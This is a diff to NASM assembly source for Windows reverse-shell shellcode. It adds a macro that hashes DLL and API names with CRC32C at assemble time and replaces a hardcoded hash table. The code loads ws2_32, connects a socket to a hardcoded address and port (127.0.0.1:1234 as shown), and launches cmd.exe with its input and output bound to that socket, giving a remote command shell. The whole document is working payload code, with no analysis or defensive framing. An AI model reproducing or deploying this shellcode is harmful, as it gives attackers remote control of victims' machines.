@@ -30,7 +30,49 @@
 
     bits   32
         
-start:    
+%macro callx 3
+  %assign %%h 0  
+  %strlen %%len %1
+  %assign %%s 1
+  
+  ; first the dll
+  %rep %%len
+    %substr %%c %1 %%s
+    %assign %%c (%%c | 0x20)
+    %assign %%b (%%c ^ (%%h & 0xFF))
+    %assign %%h (%%h >> 8)    
+    %rep 8
+      %assign %%b (%%b >> 1) ^ ((0x82F63B78 * (%%b & 1)) & 0xFFFFFFFF)  
+    %endrep
+    %assign %%h (%%h ^ %%b)
+    %assign %%s (%%s + 1)
+  %endrep
+  
+  %assign %%dll_h %%h
+
+  %assign %%h 0
+  %strlen %%len %2
+  %assign %%s 1
+  
+  ; then the api
+  %rep %%len
+    %substr %%c %2 %%s
+    %assign %%c (%%c | 0x20)
+    %assign %%b (%%c ^ (%%h & 0xFF))
+    %assign %%h (%%h >> 8)    
+    %rep 8
+      %assign %%b (%%b >> 1) ^ ((0x82F63B78 * (%%b & 1)) & 0xFFFFFFFF) 
+    %endrep
+    %assign %%h (%%h ^ %%b)
+    %assign %%s (%%s + 1)
+  %endrep
+  
+  mov  cl, %3 
+  db   0b8h
+  dd   (%%dll_h + %%h) & 0xFFFFFFFF
+  call ebp
+%endmacro
+   
     push   ebx
     push   ebp
     push   edi
@@ -39,12 +81,12 @@ start:
 rc_l1:
     pop    esi       ; esi = crc hashes, strings
     xor    ecx, ecx
-    mov    cl, (get_api - cfg_data)
+    mov    cl, (get_api - crc32cx)
     dec    eax
     lea    ebp, [esi+ecx]   ; ebp = get_api
     
-    mov    cl, (rc_l2 - cfg_data) & 0xFF
-    mov    ch, (rc_l2 - cfg_data) >> 8
+    mov    cl, (rc_l2 - crc32cx) & 0xFF
+    mov    ch, (rc_l2 - crc32cx) >> 8
     dec    eax
     lea    edx, [esi+ecx]   ; edx = rc_l2
 
@@ -56,25 +98,9 @@ rc_l1:
     ret
 rc_l0:
     call   rc_l1
-cfg_data:
-    db     1
-    dd     0xA452DBF7   ; LoadLibraryA
-    db     2
-    dd     0xC9854299   ; WSAStartup
-    db     6
-    dd     0x93192D14   ; WSASocketA
-    db     3
-    dd     0xD2391B9C   ; connect       
-    db     10
-    dd     0xE4B134B4   ; CreateProcessA 
-    db     2
-    dd     0xDDB22F93   ; WaitForSingleObject
-    db     1
-    dd     0x3CE9170E   ; closesocket
     
 ; in:  esi = s
 ; out: eax = crc32c(s)
-;   
 crc32cx:
     push   ecx 
     push   edx 
@@ -83,6 +109,9 @@ crc32cx:
     cdq                      ; edx = 0
 crc_l0x:
     lodsb                    ; al = *s++ | 0x20
+    test   al, al
+    jz     crc_l3x
+    
     or     al, 0x20
     xor    dl, al            ; crc ^= c
     push   8
@@ -93,8 +122,8 @@ crc_l1x:
     xor    edx, 0x82F63B78
 crc_l2x:
     loop   crc_l1x
-    cmp    al, 0x20          ; until al==0
-    jnz    crc_l0x
+    jmp    crc_l0x
+crc_l3x:    
     xchg   eax, edx
     
     pop    edx
@@ -181,10 +210,9 @@ exp_l2x:
     
 ; LPVOID get_api(DWORD hash);
 get_api:
-    lodsb                   ; al = arg count
-    movzx  eax, al
-    push   eax
-    lodsd                   ; eax = crc32c    
+    movzx  ecx, cl
+    push   ecx
+    
     push   ebx
     push   edi
     push   esi
@@ -285,29 +313,26 @@ gapi_l6x:
     bits   32    
 
 rc_l2:    
-    add    esp, -384   ; edi = alloc(384)
-    mov    edi, esp
+    add    esp, -512   ; edi = alloc(512)
+    push   esp
+    pop    edi
     
     ; LoadLibraryA ("ws2_32");
-    xor    eax, eax
-    cdq
-    push   eax
-    push   eax
-    mov    edx, esp
+    push   edi
+    mov    eax, 'ws2_'
+    stosd
     mov    eax, ~'32'
     not    eax
-    mov    dword[edx+4], eax
-    mov    dword[edx], 'ws2_'
-    push   edx    
-    call   ebp
-    pop    eax
-    pop    eax
+    stosd
+    callx  "kernel32.dll", "LoadLibraryA", 1
     
     ; WSAStartup (MAKEWORD(2,0), &wsa);
     push   edi         ; &wsa
     push   2           ; MAKEWORD(2, 0)
-    call   ebp
-
+    callx  "ws2_32.dll", "WSAStartup", 2
+    test   eax, eax
+    jnz    xit
+    
     ; WSASocket (AF_INET, SOCK_STREAM, 
     ;     IPPROTO_IP, NULL, 0, 0);
     push   eax         ; 0
@@ -316,48 +341,47 @@ rc_l2:
     push   eax         ; IPPROTO_IP
     push   1           ; SOCK_STREAM
     push   2           ; AF_INET 
-    call   ebp
+    callx  "ws2_32.dll", "WSASocketA", 6
     
     xchg   eax, ebx    ; ebx = s
 
     ; connect (s, (struct sockaddr*)&sa, sizeof(sa));
     push   16          ; sizeof(sa)
     push   edi         ; &sa
-
     mov    eax, ~0xD2040002 & 0xFFFFFFFF  ; 1234, AF_INET 
     not    eax
-    stosd
-    
+    stosd    
     mov    eax, ~0x0100007F & 0xFFFFFFFF  ; 127.0.0.1
     not    eax
-    stosd
-    
+    stosd    
     xor    eax, eax
     stosd
-    stosd
-    
+    stosd    
     push   ebx         ; s
-    call   ebp
+    callx  "ws2_32.dll", "connect", 3
+    test   eax, eax
+    jnz    cls_s
     
-    push   esp
-    pop    edi
-    
-    push   edi    
+    ; initialize STARTUPINFO
+    ; here is where it gets a bit tricky
     mov    al, 104
+    push   edi
     stosd
-    mov    al, 100
+    ; si.cb = sizeof(STARTUPINFO)
+    ; memset(&si.lpReserved, 0, sizeof(si) - sizeof(DWORD))
     xchg   eax, ecx
     xor    eax, eax
     rep    stosb
     pop    edi
+
     push   edi
     
     dec    eax
     js     rc_l9x
-    mov    cl, 24
+    mov    cl, 24 ; loaded for x64
 rc_l9x:    
     dec    eax
-    lea    edi, [edi+ecx+56] ; 56 for 32, 80 for x64
+    lea    edi, [edi+ecx+56] ; 56 for 32-bit, 80 for 64-bit
 
     mov    cl, 3
 rc_l6x:    
@@ -365,25 +389,27 @@ rc_l6x:
     dec    eax
     scasd
     loop   rc_l6x
-    
+
     xor    eax, eax
     dec    eax
     js     rc_l10x
-    mov    cl, 16
+    mov    cl, 16  ; loaded for x64
     
 rc_l10x:    
     pop    edx
     
     ; CreateProcess (NULL, "cmd", NULL, NULL, 
     ;     TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-    inc    dword[edx+ecx+45]
+    ;
+    ; si.dwFlags = STARTF_USESTDHANDLES;
+    inc    dword[edx+ecx+45] 
     mov    eax, ~'cmd'
     not    eax
     push   edi
     stosd 
-    pop    eax
-    push   edi         ; &pi         
-    push   edx         ; &si
+    pop    eax         ; eax = "cmd", 0
+    push   edi         ; edi = &pi          
+    push   edx         ; edx = &si
     xor    ecx, ecx    ; ecx = NULL
 
     push   8
@@ -398,19 +424,32 @@ rc_l10x:
     push   ecx         ; NULL    
     push   eax         ; "cmd", 0
     push   ecx         ; NULL
-    call   ebp
+    callx  "kernel32.dll", "CreateProcessA", 10
     neg    eax
-    jns    bd_cls
+    jns    cls_s
+    
+    push   edi
+    pop    esi
     
     ; WaitForSingleObject (pi.hProcess, INFINITE);
     push   eax         ; INFINITE
-    mov    eax, [edi]
+    mov    eax, [esi]
     push   eax         ; pi.hProcess
-    call   ebp
-bd_cls:    
+    callx  "kernel32.dll", "WaitForSingleObject", 2
+    
+    ; CloseHandle (pi.hProcess);
+    lodsd
+    push   eax 
+    callx  "kernel32.dll", "CloseHandle", 1
+
+    ; CloseHandle (pi.hThread);    
+    lodsd
+    push   eax    
+    callx  "kernel32.dll", "CloseHandle", 1     
+cls_s:    
     ; closesocket (s);
     push   ebx         ; s
-    call   ebp
-    
+    callx  "ws2_32.dll", "closesocket", 1
+xit:    
     sub    esp, -512
     ret    
